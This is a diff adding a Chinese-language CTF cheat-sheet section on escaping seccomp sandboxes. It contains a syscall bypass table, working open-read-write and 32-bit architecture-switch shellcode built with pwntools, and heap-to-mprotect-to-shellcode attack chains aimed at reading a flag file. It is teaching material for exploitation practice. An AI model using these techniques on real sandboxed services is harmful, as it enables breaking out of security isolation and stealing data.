@@ -427,6 +427,144 @@ cat run.sh  # 查看 QEMU 参数 (kaslr, smep, smap, kpti)
 
 ---
 
+## Seccomp 沙箱逃逸
+
+### 检测 Seccomp
+
+```bash
+# seccomp-tools (Ruby gem)
+seccomp-tools dump ./binary
+# 输出规则列表: ALLOW/KILL syscall
+
+# 或 pwntools
+from pwn import *
+print(ELF('./binary').checksec())
+# 看到 seccomp: enabled 时需要分析规则
+```
+
+### 常见沙箱策略与绕过
+
+| 禁止的 Syscall | 绕过方案 |
+|---------------|---------|
+| execve | ORW: open+read+write 读 flag |
+| execve+open | openat(AT_FDCWD, "/flag", 0) 替代 open |
+| execve+open+openat | openat2 (syscall 437) 或 name_to_handle_at+open_by_handle_at |
+| read | preadv / preadv2 / process_vm_readv |
+| write | writev / pwritev / sendfile(stdout, fd, 0, 0x100) |
+| 所有文件操作 | 侧信道: 逐字节猜测 flag, 用 nanosleep/clock_gettime 计时 |
+| ARCH==x86_64 | retf 切换到 32-bit mode, 使用 32-bit syscall number 绕过 |
+
+### ORW Shellcode (pwntools)
+
+```python
+from pwn import *
+context.arch = 'amd64'
+
+# 标准 ORW
+shellcode = asm('''
+    /* open("/flag", O_RDONLY) */
+    push 0x67616c66        /* "flag" reversed */
+    mov rdi, rsp
+    xor esi, esi           /* O_RDONLY */
+    push SYS_open
+    pop rax
+    syscall
+
+    /* read(fd, rsp, 0x100) */
+    mov rdi, rax           /* fd from open */
+    mov rsi, rsp
+    mov rdx, 0x100
+    push SYS_read
+    pop rax
+    syscall
+
+    /* write(1, rsp, 0x100) */
+    push 1
+    pop rdi
+    mov rsi, rsp
+    mov rdx, 0x100
+    push SYS_write
+    pop rax
+    syscall
+''')
+
+# 或 shellcraft 快速版
+shellcode = asm(
+    shellcraft.open('/flag') +
+    shellcraft.read('rax', 'rsp', 0x100) +
+    shellcraft.write(1, 'rsp', 0x100)
+)
+
+# openat 版本 (绕过禁 open)
+shellcode = asm(
+    shellcraft.openat(-100, '/flag', 0) +   # AT_FDCWD = -100
+    shellcraft.read('rax', 'rsp', 0x100) +
+    shellcraft.write(1, 'rsp', 0x100)
+)
+
+# sendfile 版本 (绕过禁 read+write)
+shellcode = asm(
+    shellcraft.open('/flag') +
+    shellcraft.sendfile(1, 'rax', 0, 0x100)
+)
+```
+
+### 架构切换绕过 (retf)
+
+```python
+# seccomp 仅检查 AUDIT_ARCH_X86_64 → 切到 32-bit 绕过
+context.arch = 'amd64'
+shellcode = asm('''
+    /* 切换到 32-bit mode */
+    push 0x23              /* CS for 32-bit mode */
+    lea eax, [rip + shellcode_32]
+    push rax
+    retf
+
+shellcode_32:
+    .code32
+    /* 32-bit open("/flag", 0) — syscall number 5 */
+    push 0x67616c66
+    mov ebx, esp
+    xor ecx, ecx
+    mov eax, 5
+    int 0x80
+
+    /* 32-bit read(fd, esp, 0x100) */
+    mov ebx, eax
+    mov ecx, esp
+    mov edx, 0x100
+    mov eax, 3
+    int 0x80
+
+    /* 32-bit write(1, esp, 0x100) */
+    mov ebx, 1
+    mov ecx, esp
+    mov edx, 0x100
+    mov eax, 4
+    int 0x80
+''')
+```
+
+### Seccomp + 堆利用组合
+
+```
+典型攻击链:
+1. 堆利用获得任意写 (tcache poison / House of Apple)
+2. 无法 system("/bin/sh") — seccomp 禁了 execve
+3. 改写 __free_hook / vtable 到 mprotect gadget
+4. mprotect 使某页 RWX
+5. 跳转到 RWX 页执行 ORW shellcode
+6. 读取 flag 输出
+
+或:
+1. House of Apple 2 → 控制 RIP
+2. 在 RIP 处放 stack pivot gadget
+3. ROP chain: mprotect → shellcode → ORW
+```
+
+---
+
 ## 提权（后利用）
 
 获取 shell 后寻找 flag：
